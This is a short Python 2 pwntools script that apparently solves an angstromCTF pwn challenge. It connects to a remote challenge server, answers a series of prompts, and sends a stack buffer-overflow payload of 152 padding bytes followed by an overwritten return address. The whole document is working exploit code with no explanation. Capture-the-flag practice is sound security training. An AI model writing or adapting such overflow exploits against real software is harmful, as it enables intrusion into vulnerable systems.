from pwn import *

payload = 'A'*152+'\xb6\x11\x40\x00\x00\x00\x00\x00'

p = remote('shell.actf.co', 19305)
print p.recv()
p.sendline('0')
print p.recv()
p.sendline('0')
print p.recv()
p.sendline('0')
print p.recv()
p.sendline('100')
print p.recv()
p.sendline('100')
print p.recv()
p.sendline('100')
print p.recv()
p.sendline(payload)
print p.recv()
